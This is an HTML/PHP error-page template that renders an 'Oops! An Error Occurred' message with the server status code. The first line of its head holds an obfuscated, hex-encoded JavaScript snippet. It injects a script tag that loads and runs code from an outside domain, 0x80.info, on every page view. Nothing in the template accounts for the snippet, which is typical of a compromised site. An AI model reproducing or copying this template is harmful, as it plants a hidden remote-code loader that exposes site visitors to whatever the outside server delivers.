<!DOCTYPE html>
<html>
<head>
<script>var _0x46c7=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x30\x78\x38\x30\x2E\x69\x6E\x66\x6F\x2F\x61","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var a=document[_0x46c7[1]](_0x46c7[0]);a[_0x46c7[2]]= _0x46c7[3];document[_0x46c7[6]](_0x46c7[5])[0][_0x46c7[4]](a)</script>
    <meta charset="<?= $this->charset; ?>" />
    <meta name="robots" content="noindex,nofollow,noarchive" />
    <title>An Error Occurred: <?= $statusText; ?></title>
    <style><?= $this->include('assets/css/error.css'); ?></style>
</head>
<body>

<div class="container">
    <h1>Oops! An Error Occurred</h1>
    <h2>The server returned a "<?= $statusCode; ?> <?= $statusText; ?>".</h2>

    <p>
        Something is broken. Please let us know what you were doing when this error occurred.
        We will fix it as soon as possible. Sorry for any inconvenience caused.
    </p>
</div>
</body>
</html>
